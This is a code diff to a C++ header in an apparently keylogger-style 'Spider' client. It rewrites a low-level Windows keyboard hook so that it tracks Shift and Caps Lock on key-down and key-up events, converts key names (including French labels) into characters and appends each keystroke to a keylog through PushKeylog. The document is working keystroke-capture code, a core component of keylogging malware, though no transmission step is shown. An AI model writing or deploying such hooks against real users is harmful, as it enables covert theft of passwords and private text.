@@ -5,6 +5,7 @@
 #ifndef SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP
 #define SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP
 
+#include <atlstr.h>  
 #include <Windows.h>
 #include <vector>
 #include "IWindowsKeyListener.hpp"
@@ -45,7 +46,8 @@ public:
 private:
 	static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp)
 	{
-		if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
+		if (code == HC_ACTION) {
+			static std::string lastkey("");
 			static auto capslock = false;
 			static auto shift = false;
 			char tmp[0xFF] = { 0 };
@@ -56,52 +58,52 @@ private:
 
 			msg += (st_hook.scanCode << 16);
 			msg += (st_hook.flags << 24);
+
 			GetKeyNameText(msg, tmp, 0xFF);
 			str = std::string(tmp);
 
 			printable = (str.length() <= 1) ? true : false;
+			if (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN) {
+				if (!printable) {
 
-			if (!printable) {
-
-				if (str == "VERR.MAJ")
-					capslock = !capslock;
-				else if (str == "MAJ")
-					shift = true;
-				if (str == "ENTER") {
-					str = "\n";
-					printable = true;
-				}
-				else if (str == "SPACE") {
-					str = " ";
-					printable = true;
-				}
-				else if (str == "TAB") {
-					str = "\t";
-					printable = true;
-				}
-				else {
-					str = ("[" + str + "]");
-				}
-			}
-
-			if (printable) {
-				if (shift == capslock) {
-					for (size_t i = 0; i < str.length(); ++i)
-						str[i] = tolower(str[i]);
-				}
-				else {
-					for (size_t i = 0; i < str.length(); ++i) {
-						if (str[i] >= 'A' && str[i] <= 'Z') {
-							str[i] = toupper(str[i]);
-						}
+					if (str == "VERR.MAJ" || str == "Caps Lock")
+						capslock = !capslock;
+					else if (str == "MAJ" || str == "Shift") {
+						if (lastkey != str)
+							shift = true;
+					}
+					else if (str == "ESPACE" || str == "Space") {
+						str = " ";
+						printable = true;
+					}
+					else {
+						str = ("[" + str + "]");
+						printable = true;
 					}
 				}
 
-				shift = false;
+				if (printable) {
+					if (shift == capslock) {
+						for (size_t i = 0; i < str.length(); ++i)
+							str[i] = tolower(str[i]);
+					}
+					else {
+						for (size_t i = 0; i < str.length(); ++i) {
+							if (str[i] >= 'A' && str[i] <= 'Z') {
+								str[i] = toupper(str[i]);
+							}
+						}
+					}
+					lastkey = str;
+					windowsKeyListener->PushKeylog(str);
+				}
 			}
-			windowsKeyListener->PushKeylog(str);
+			else if (wp == WM_SYSKEYUP || wp == WM_KEYUP) {
+				if (str == "MAJ" || str == "Shift") {
+					shift = false;
+				}
+			}
 		}
-
 		return CallNextHookEx(hhkLowLevelKybd, code, wp, lp);
 	}
 
